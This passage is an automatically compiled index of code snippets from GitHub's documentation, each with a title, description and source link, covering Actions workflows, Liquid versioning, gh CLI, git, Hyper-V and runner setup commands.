{\n  enterprise(slug: $slug) {\n    ...enterpriseFragment\n  }\n}\n\nfragment enterpriseFragment on Enterprise {\n  ... on Enterprise{\n    name\n    organizations(first: 100){\n      nodes{\n        name\n        ... on Organization{\n          name\n          repositories(privacy: PUBLIC){\n            totalCount\n          }\n        }\n      }\n    }\n  }\n}\n\n# Passing our Enterprise Account as a variable\nvariables {\n  \"slug\": \"<enterprise-account-name>\"\n}\n```\n\n----------------------------------------\n\nTITLE: Clearing macOS Keychain Credentials for HTTPS\nDESCRIPTION: This command clears stored HTTPS credentials for GitHub from the macOS keychain. It is necessary when switching between multiple accounts that use HTTPS authentication to ensure Git prompts for the correct credentials.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-your-personal-account/managing-multiple-accounts.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit credential-osxkeychain erase\nhost={% data variables.product.product_url %}\nprotocol=https\n> [Press Return]\n>\n```\n\n----------------------------------------\n\nTITLE: Deploying GitHub Pages Artifact\nDESCRIPTION: This snippet deploys a GitHub Pages artifact using the `actions/deploy-pages` action. The job requires `pages: write` and `id-token: write` permissions and must specify the `needs` parameter to ensure the build step completes before deployment. An environment is also required.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/getting-started-with-github-pages/using-custom-workflows-with-github-pages.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n# ...\n\njobs:\n  deploy:\n    permissions:\n      contents: read\n      pages: write\n      id-token: write\n    runs-on: ubuntu-latest\n    needs: jekyll-build\n    environment:\n      name: github-pages\n      url: {% raw %}${{steps.deployment.outputs.page_url}}{% endraw %}\n    steps:\n      - name: Deploy artifact\n        id: deployment\n{%- ifversion fpt or ghec %}\n        uses: actions/deploy-pages@v4\n{%- elsif ghes %}\n        uses: actions/deploy-pages@v3\n{%- endif %}\n# ...\n```\n\n----------------------------------------\n\nTITLE: Starting the VM in PowerShell\nDESCRIPTION: This PowerShell command starts the virtual machine with the specified name. Replace VM_NAME with the name of the VM you created.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-hyper-v.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nPS C:\\> Start-VM -Name VM_NAME\n```\n\n----------------------------------------\n\nTITLE: Running Vitest Tests with Fixture Root, Translations, and Debugging\nDESCRIPTION: This command executes Vitest tests against fixture content, including translations, with debugging enabled. It sets the DEBUG_MIDDLEWARE_TESTS, ROOT and TRANSLATIONS_FIXTURE_ROOT environment variables to facilitate debugging of middleware tests by providing stack traces for internal server errors.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/README.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nDEBUG_MIDDLEWARE_TESTS=true ROOT=src/fixtures/fixtures TRANSLATIONS_FIXTURE_ROOT=src/fixtures/fixtures/translations vitest src/fixtures/tests\n```\n\n----------------------------------------\n\nTITLE: Nested Conditional Rendering (GHES > 2.16 and GHES > 2.13) - Liquid\nDESCRIPTION: This snippet demonstrates nested conditional rendering. It first checks if the GHES version is greater than 2.16. If true, it renders 'Alpha'. Otherwise, it renders 'Bravo' and then checks if the product is not FPT and the GHES version is greater than 2.13, rendering 'Charlie' if both are true.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/and-greater-than1.md#_snippet_2\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.16 %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion not fpt and ghes > 2.13 %}\n\nCharlie\n\n{% endif %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: NuGet: Disabling nuget.org in nuget.config\nDESCRIPTION: This snippet shows how to disable the public NuGet feed (nuget.org) in the `nuget.config` file. By setting `nuget.org` to `true` in the `disabledPackageSources` section, Dependabot will only use the configured private registry.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_11\n\nLANGUAGE: xml\nCODE:\n```\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<configuration>\n  <packageSources>\n    <add key=\"example-nuget\" value=\"https://private_registry_url/nuget/example-nuget/index.json\" />\n  </packageSources>\n  <disabledPackageSources>\n    <add key=\"nuget.org\" value=\"true\" />\n  </disabledPackageSources>\n</configuration>\n```\n\n----------------------------------------\n\nTITLE: Searching models by rate limit tier on GitHub Marketplace\nDESCRIPTION: This snippet demonstrates how to search for models with a 'low' rate limit tier using the `rate-limit-tier` qualifier.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/searching-github-models.md#_snippet_16\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/search?q=rate-limit-tier:low&type=marketplace\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_RUNNER_EXECUTABLE_ARCH to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_RUNNER_EXECUTABLE_ARCH` to the GitHub Actions equivalent `${{ runner.os }}`. It represents the runner OS.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_46\n\nLANGUAGE: YAML\nCODE:\n```\n${{ runner.os }}\n```\n\n----------------------------------------\n\nTITLE: Committing and tagging the action\nDESCRIPTION: Commands used to commit the changes, tag the release, and push the action to the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-docker-container-action.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\ngit add action.yml entrypoint.sh Dockerfile README.md\ngit commit -m \"My first action is ready\"\ngit tag -a -m \"My first action release\" v1\ngit push --follow-tags\n```\n\n----------------------------------------\n\nTITLE: Authenticating with GitHub CLI\nDESCRIPTION: This command authenticates the user with the GitHub CLI. It is a prerequisite for installing the GitHub Copilot CLI extension. The user will be prompted to authenticate in the browser.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/installing-github-copilot-in-the-cli.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngh auth login\n```\n\n----------------------------------------\n\nTITLE: Running Playwright Tests by Description\nDESCRIPTION: This command runs tests whose description contains the specified text, enabling filtering based on test names.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nnpm run playwright-test -- -g \"view home page\"\n```\n\n----------------------------------------\n\nTITLE: Mapping GITLAB_USER_EMAIL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `GITLAB_USER_EMAIL` to the GitHub Actions equivalent `${{ github.actor }}`. Provides actor email.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_51\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.actor }}\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_SERVER to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_SERVER` to the GitHub Actions equivalent `${{ github.actions }}`. Check whether Actions is available.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_49\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.actions }}\n```\n\n----------------------------------------\n\nTITLE: Incorrect Header Structure Example\nDESCRIPTION: Demonstrates an incorrect header structure in Markdown, where header levels are skipped (e.g., going directly from H2 to H4).\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_12\n\nLANGUAGE: Markdown\nCODE:\n```\n## HEADER (H2)\n\n#### SUBHEADER (H4)\n```\n\n----------------------------------------\n\nTITLE: Conditional rendering with NOT for GHEC\nDESCRIPTION: This snippet checks if the current version is NOT GHEC and renders 'condition-i' if it is not.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/ifversion.md#_snippet_6\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion not ghec %}\ncondition-i\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Automatically fixing fixable errors\nDESCRIPTION: This command automatically fixes errors that have the `fixable: true` property in their description on staged/changed files.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content -- --fix\n```\n\n----------------------------------------\n\nTITLE: Authenticate with GitHub CLI\nDESCRIPTION: This command initiates the authentication process for the GitHub CLI. It prompts the user to select the GitHub instance and authenticate via the browser.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/rest-api/github-cli-install-and-auth.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh auth login\n```\n\n----------------------------------------\n\nTITLE: Searching with Regular Expressions\nDESCRIPTION: This snippet demonstrates how to use regular expressions in code search. It searches for the pattern `sparse.*index`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_27\n\nLANGUAGE: text\nCODE:\n```\n/sparse.*index/\n```\n\n----------------------------------------\n\nTITLE: Installing Runner Service - macOS\nDESCRIPTION: Installs the self-hosted runner as a service on macOS systems using the `svc.sh` script. Requires the user to be in the directory where the runner application is installed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\n./svc.sh install\n```\n\n----------------------------------------\n\nTITLE: Cloning a GitHub repository using gh repo clone\nDESCRIPTION: This command clones the specified GitHub repository to the local computer.  It requires the repository owner and name as input.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngh repo clone OWNER/REPO\n```\n\nLANGUAGE: Shell\nCODE:\n```\ngh repo clone octo-org/octo-repo\n```\n\n----------------------------------------\n\nTITLE: Uninstalling Runner Service - Windows\nDESCRIPTION: Uninstalls the self-hosted runner service on Windows using PowerShell. Requires the `actions.runner.*` service name. The service name is stored in `service_win_name` variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_12\n\nLANGUAGE: powershell\nCODE:\n```\nRemove-Service \"{{ service_win_name }}\"\n```\n\n----------------------------------------\n\nTITLE: Debugging Playwright Tests\nDESCRIPTION: This command runs a specific test in debug and headed mode, opening a debugger and browser window for interactive debugging.  It allows inspecting the DOM and stepping through the test execution.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/PLAYWRIGHT.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nnpm run playwright-test -- -g \"view home page\" --debug --headed\n```\n\n----------------------------------------\n\nTITLE: Starting a local GitHub Docs server\nDESCRIPTION: This shell script demonstrates the commands to clone the GitHub Docs repository, navigate to the directory, install dependencies using `npm ci`, and start the local development server using `npm start`. It assumes Node.js and npm are already installed.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/creating-a-local-environment.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit clone https://github.com/github/docs\ncd docs\nnpm ci\nnpm start\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering with fpt or GHES Version Check\nDESCRIPTION: This snippet shows how to conditionally render content if either `fpt` is true or the GHES version is greater than 2.13. It combines the `fpt` check with a GHES version comparison using `or`. The output depends on the `fpt` variable and the current GHES version.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes > 2.13 %}\n\nAlpha\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Conditional Check for Product Version using Liquid\nDESCRIPTION: This snippet uses Liquid templating to check if the current product version is either `fpt` or `ghec`. If it is, it displays a message indicating that either {% data variables.product.prodname_team %} or {% data variables.product.prodname_enterprise %} is required.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gated-features/ghas-billing.md#_snippet_0\n\nLANGUAGE: liquid\nCODE:\n```\n{% ifversion fpt or ghec %}\nRequires {% data variables.product.prodname_team %} or {% data variables.product.prodname_enterprise %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configuring Git Line Endings on macOS\nDESCRIPTION: This snippet configures Git to handle line endings correctly on macOS by setting the `core.autocrlf` option to `input`. This ensures that line endings in files checked out are appropriate for macOS environments.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/configuring-git-to-handle-line-endings.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git config --global core.autocrlf input\n# Configure Git to ensure line endings in files you checkout are correct for macOS\n```\n\n----------------------------------------\n\nTITLE: Defining a Bug Report Issue Form\nDESCRIPTION: This YAML snippet defines a bug report issue form, specifying its name, description, title format, labels, associated projects, and assignees. It also configures the form's body, which includes markdown text, input fields, text areas, dropdown menus, and checkboxes.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/community/issue-forms-sample.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Bug Report\ndescription: File a bug report.\ntitle: \"[Bug]: \"\nlabels: [\"bug\", \"triage\"]\nprojects: [\"octo-org/1\", \"octo-org/44\"]\nassignees:\n  - octocat\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        Thanks for taking the time to fill out this bug report!\n  - type: input\n    id: contact\n    attributes:\n      label: Contact Details\n      description: How can we get in touch with you if we need more info?\n      placeholder: ex. email@example.com\n    validations:\n      required: false\n  - type: textarea\n    id: what-happened\n    attributes:\n      label: What happened?\n      description: Also tell us, what did you expect to happen?\n      placeholder: Tell us what you see!\n      value: \"A bug happened!\"\n    validations:\n      required: true\n  - type: dropdown\n    id: version\n    attributes:\n      label: Version\n      description: What version of our software are you running?\n      options:\n        - 1.0.2 (Default)\n        - 1.0.3 (Edge)\n      default: 0\n    validations:\n      required: true\n  - type: dropdown\n    id: browsers\n    attributes:\n      label: What browsers are you seeing the problem on?\n      multiple: true\n      options:\n        - Firefox\n        - Chrome\n        - Safari\n        - Microsoft Edge\n  - type: textarea\n    id: logs\n    attributes:\n      label: Relevant log output\n      description: Please copy and paste any relevant log output. This will be automatically formatted into code, so no need for backticks.\n      render: shell\n  - type: checkboxes\n    id: terms\n    attributes:\n      label: Code of Conduct\n      description: By submitting this issue, you agree to follow our [Code of Conduct](https://example.com). \n      options:\n        - label: I agree to follow this project's Code of Conduct\n          required: true\n```\n\n----------------------------------------\n\nTITLE: Checking Runner Service Status - macOS\nDESCRIPTION: Checks the status of the self-hosted runner service on macOS systems using `svc.sh`. Requires the user to be in the directory where the runner application is installed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\n./svc.sh status\n```\n\n----------------------------------------\n\nTITLE: Creating issue with an assignee via URL query parameters\nDESCRIPTION: This URL demonstrates how to create a new issue and assign it to a user using the `assignees` query parameter. The example assigns the issue to the user \"octocat.\"\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/creating-an-issue.md#_snippet_6\n\nLANGUAGE: URL\nCODE:\n```\nhttps://github.com/octo-org/octo-repo/issues/new?assignees=octocat\n```\n\n----------------------------------------\n\nTITLE: Repository Dispatch Event JSON Payload Example (JSON)\nDESCRIPTION: This JSON payload shows an example of the data that can be sent when creating a `repository_dispatch` event. The `event_type` is set to `test_result`, and the `client_payload` contains information about the test results.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_44\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"event_type\": \"test_result\",\n  \"client_payload\": {\n    \"passed\": false,\n    \"message\": \"Error: timeout\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example of Invalid JSON Data\nDESCRIPTION: This JSON data snippet contains an error: the `conditions` value within the `current_weather` object is missing a closing quotation mark. This leads to a parsing error, as the JSON structure is incomplete.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/debugging-errors/debugging-invalid-json.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"location\": \"San Francisco\",\n  \"current_weather\": {\n    \"temperature\": 18,\n    \"unit\": \"Celsius\",\n    \"conditions\": \"Cloudy\n  },\n  \"forecast\": {\n    \"day\": \"Monday\",\n    \"high\": 22,\n    \"low\": 15,\n    \"precipitation\": 10\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow for Redelivering Failed Webhooks (YAML)\nDESCRIPTION: This GitHub Actions workflow is designed to periodically check for and redeliver failed webhook deliveries. It runs every 6 hours or can be manually triggered. It checks out the repository content, sets up Node.js, installs the octokit library, and then executes a Node.js script to handle the redelivery process. It requires a {% data variables.product.pat_generic %} stored as a secret and several environment variables to be configured correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/using-webhooks/automatically-redelivering-failed-deliveries-for-a-repository-webhook.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n#\nname: Redeliver failed webhook deliveries\n\n# This workflow runs every 6 hours or when manually triggered.\non:\n  schedule:\n    - cron: '20 */6 * * *'\n  workflow_dispatch:\n\n# This workflow will use the built in `GITHUB_TOKEN` to check out the repository contents. This grants `GITHUB_TOKEN` permission to do that.\npermissions:\n  contents: read\n\n#\njobs:\n  redeliver-failed-deliveries:\n    name: Redeliver failed deliveries\n    runs-on: ubuntu-latest\n    steps:\n      # This workflow will run a script that is stored in the repository. This step checks out the repository contents so that the workflow can access the script.\n      - name: Check out repo content\n        uses: {% data reusables.actions.action-checkout %}\n\n      # This step sets up Node.js. The script that this workflow will run uses Node.js.\n      - name: Setup Node.js\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '18.x'\n\n      # This step installs the octokit library. The script that this workflow will run uses the octokit library.\n      - name: Install dependencies\n        run: npm install octokit\n\n      # This step sets some environment variables, then runs a script to find and redeliver failed webhook deliveries.\n      # - Replace `YOUR_SECRET_NAME` with the name of the secret where you stored your {% data variables.product.pat_generic %}.\n      # - Replace `YOUR_REPO_OWNER` with the owner of the repository where the webhook was created.\n      # - Replace `YOUR_REPO_NAME` with the name of the repository where the webhook was created.\n      # - Replace `YOUR_HOOK_ID` with the ID of the webhook.\n      # - Replace `YOUR_LAST_REDELIVERY_VARIABLE_NAME` with the name that you want to use for a configuration variable that will be stored in the repository where this workflow is stored. The name can be any string that contains only alphanumeric characters and `_`, and does not start with `GITHUB_` or a number. For more information, see [AUTOTITLE](/actions/learn-github-actions/variables#defining-configuration-variables-for-multiple-workflows).\n      {% ifversion ghes %}# - Replace `YOUR_HOSTNAME` with the name of {% data variables.location.product_location %}.{% endif %}\n      - name: Run script\n        env:\n          TOKEN: {% raw %}${{ secrets.YOUR_SECRET_NAME }}{% endraw %}\n          REPO_OWNER: 'YOUR_REPO_OWNER'\n          REPO_NAME: 'YOUR_REPO_NAME'\n          HOOK_ID: 'YOUR_HOOK_ID'\n          LAST_REDELIVERY_VARIABLE_NAME: 'YOUR_LAST_REDELIVERY_VARIABLE_NAME'\n          {% ifversion ghes %}HOSTNAME: 'YOUR_HOSTNAME'{% endif %}\n          WORKFLOW_REPO_NAME: {% raw %}${{ github.event.repository.name }}{% endraw %}\n          WORKFLOW_REPO_OWNER: {% raw %}${{ github.repository_owner }}{% endraw %}\n        run: |\n          node .github/workflows/scripts/redeliver-failed-deliveries.js\n```\n\n----------------------------------------\n\nTITLE: Sending Default Chat Message SSE - Text\nDESCRIPTION: This code snippet demonstrates how to send a default, unnamed server-sent event (SSE) to the Copilot platform for a general chat message. It's solely transmitted through the data field and provides information about the chat completion, model used, and content.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/configuring-your-copilot-agent-to-communicate-with-the-copilot-platform.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\ndata: {\"id\":\"chatcmpl-123\",\"object\":\"chat.completion.chunk\",\"created\":1694268190,\"model\":\"gpt-3.5-turbo-0125\", \"system_fingerprint\": \"fp_44709d6fcb\", \"choices\":[{\"index\":0,\"delta\":{\"role\":\"assistant\",\"content\":\"\"},\"logprobs\":null,\"finish_reason\":null}]}\n```\n\n----------------------------------------\n\nTITLE: Creating a New Generation 1 Virtual Machine in PowerShell\nDESCRIPTION: This PowerShell command creates a new Generation 1 virtual machine in Hyper-V. It sets the VM name, memory size, boot device, and VHD path. Replace VM_NAME with the desired name, MEMORY_SIZE with the appropriate memory allocation, and PATH_TO_VHD with the location of the downloaded VHD image.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-hyper-v.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nPS C:\\> New-VM -Generation 1 -Name VM_NAME -MemoryStartupBytes MEMORY_SIZE -BootDevice VHD -VHDPath PATH_TO_VHD  \n```\n\n----------------------------------------\n\nTITLE: Adding a Draft Issue to a Project using GraphQL with gh\nDESCRIPTION: This snippet shows how to add a draft issue to a project using the GitHub CLI (`gh`) and GraphQL.  It utilizes the `gh api graphql` command, requiring the same `PROJECT_ID`, `TITLE`, and `BODY` replacements as the curl example.  The `gh` CLI handles authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_18\n\nLANGUAGE: shell\nCODE:\n```\ngh api graphql -f query='\\n  mutation {\\n    addProjectV2DraftIssue(input: {projectId: \"PROJECT_ID\" title: \"TITLE\" body: \"BODY\"}) {\\n      projectItem {\\n        id\\n      }\\n    }\\n  }'\n```\n\n----------------------------------------\n\nTITLE: Saving changes to the GPG Key\nDESCRIPTION: This command is executed within the GPG command-line interface to persist changes made to the GPG key, such as adding a new user ID. The changes are saved after entering your key's passphrase. This command ensures that the changes made to the GPG key are saved for future use.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/associating-an-email-with-your-gpg-key.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\ngpg> save\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log by Time\nDESCRIPTION: This snippet demonstrates how to use the `created` qualifier to filter audit log events based on the time the action occurred. It includes examples for searching by a specific date, a date range, and before or after a specific date.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/auditing-users-across-your-enterprise.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\ncreated:2014-07-08\n```\n\nLANGUAGE: text\nCODE:\n```\ncreated:>=2014-07-01\n```\n\nLANGUAGE: text\nCODE:\n```\ncreated:<=2014-07-01\n```\n\nLANGUAGE: text\nCODE:\n```\ncreated:2014-07-01..2014-07-31\n```\n\n----------------------------------------\n\nTITLE: Valid Branch Filter - YAML\nDESCRIPTION: This example shows the correct syntax for specifying branch filters in a workflow configuration using a flow sequence.  The pattern `'release/v[0-9].[0-9]'` is enclosed in quotes because it contains `[` and `]`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_40\n\nLANGUAGE: yaml\nCODE:\n```\n# Valid\nbranches: [ main, 'release/v[0-9].[0-9]' ]\n```\n\n----------------------------------------\n\nTITLE: Code Block with Copy Button\nDESCRIPTION: This snippet illustrates how to add a copy button to code blocks by using the ` copy` annotation after the code fences and specifying a language. The `data-clipboard-text` attribute of the button will contain the un-highlighted code.\nSOURCE: https://github.com/github/docs/blob/main/src/content-render/README.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n```js copy\nconst copyMe = true\n```\n```\n\n----------------------------------------\n\nTITLE: Getting Repository Name with ghe-nwo (Shell)\nDESCRIPTION: The `ghe-nwo` utility returns a repository's name and owner based on the provided repository ID. The utility requires a repository ID as an argument.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_14\n\nLANGUAGE: shell\nCODE:\n```\nghe-nwo REPOSITORY_ID\n```\n\n----------------------------------------\n\nTITLE: Creating a Migration Source with GraphQL Mutation\nDESCRIPTION: This GraphQL mutation, `createMigrationSource`, is used to define the source of the migration. It requires the name, URL, and owner ID of the GitHub Enterprise Server instance. The type is set to GITHUB_ARCHIVE.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nmutation createMigrationSource($name: String!, $url: String!, $ownerId: ID!) {\n  createMigrationSource(input: {name: $name, url: $url, ownerId: $ownerId, type: GITHUB_ARCHIVE}) {\n    migrationSource {\n      id\n      name\n      url\n      type\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading Reports with Curl\nDESCRIPTION: This snippet demonstrates how to download the 'all users' report programmatically using curl with HTTP authentication and a personal access token (PAT). The PAT requires the `site_admin` scope. The initial request might return a 202 response, requiring a second request to download the generated report.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/exploring-user-activity-in-your-enterprise/accessing-reports-for-your-instance.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl --remote-name \\\n     --location \\\n     --user 'USERNAME:TOKEN' \\\n     http(s)://HOSTNAME/stafftools/reports/all_users.csv\n```\n\n----------------------------------------\n\nTITLE: Adding and Committing to Git in Shell\nDESCRIPTION: These shell commands add all changed files to the Git staging area and then commit them with the message 'Initial GitHub pages site with Jekyll'.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ngit add .\ngit commit -m 'Initial GitHub pages site with Jekyll'\n```\n\n----------------------------------------\n\nTITLE: Define domains for downloading actions\nDESCRIPTION: These domains are needed to download actions required for workflow execution. Ensures actions can be retrieved from the GitHub infrastructure.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/runner-essential-communications.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncodeload.github.com\npkg.actions.githubusercontent.com\n```\n\n----------------------------------------\n\nTITLE: Clean apt Cache - apt clean\nDESCRIPTION: This command cleans the apt package cache, removing downloaded package files that are no longer necessary. It helps reclaim disk space within the GitHub Codespaces environment and uses `sudo` for elevated privileges.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-creation-and-deletion-of-codespaces.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nsudo apt clean\n```\n\n----------------------------------------\n\nTITLE: New GitHub Actions billing response example\nDESCRIPTION: This is an example of the JSON response from the new billing platform for GitHub Actions billing. It shows the structure and properties of the new response format, including usage items with details such as date, product, SKU, quantity, unit type, price per unit, gross amount, discount amount, net amount, organization name, and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/billing/using-the-new-billing-platform/automating-usage-reporting.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{ \"usageItems\": [ { \"date\": \"2023-08-01\", \"product\": \"Actions\", \"sku\": \"Actions Linux\", \"quantity\": 100, \"unitType\": \"minutes\", \"pricePerUnit\": 0.008, \"grossAmount\": 0.8, \"discountAmount\": 0, \"netAmount\": 0.8, \"organizationName\": \"GitHub\", \"repositoryName\": \"github/example\"} ] }\n```\n\n----------------------------------------\n\nTITLE: Checking settings.json for Port Attributes (JSON)\nDESCRIPTION: This snippet demonstrates the expected configuration in the `settings.json` file that {% data variables.product.prodname_github_codespaces %} generates based on the `devcontainer.json` file. This configuration ensures that port 3000, labeled as \"Application\", opens in a Simple Browser preview when automatically forwarded. The settings.json file is located in the codespace.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/troubleshooting-simple-browser.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n \"remote.portsAttributes\": {\n        \"3000\": {\n            \"label\": \"Application\",\n            \"onAutoForward\": \"openPreview\"\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: Example Log Entry (JetBrains)\nDESCRIPTION: Illustrates the format of a log entry in JetBrains IDEs when GitHub Copilot finds matching public code. The log entry shows the date, time, message, file path, line number, and a list of matches including license type and URL.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/finding-public-code-that-matches-github-copilot-suggestions.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\n2025-02-26 09:22:12,045 [5581906] INFO - #copilot - [Public Code References] Text found matching public code in file:///Users/mona-lisa/git-repos/test-repo/fizzbuzz.js [Ln 1, Col 10] near fizzBuzz() ...:\n  1) [NOASSERTION] https://github.com/nixsticks/todos/blob/ae427a721c7784da64a619ba17f60637fe1cc819/Loops/fizzbuzz/fizzbuzz.js\n  2) [GPL-3.0] https://github.com/voloslg/algocasts/blob/34b423517486f908ca167b390d3b8bd05653829f/exercises/fizzbuzz/index.js\n```\n\n----------------------------------------\n\nTITLE: Finding Current Machine Type with GitHub CLI\nDESCRIPTION: This 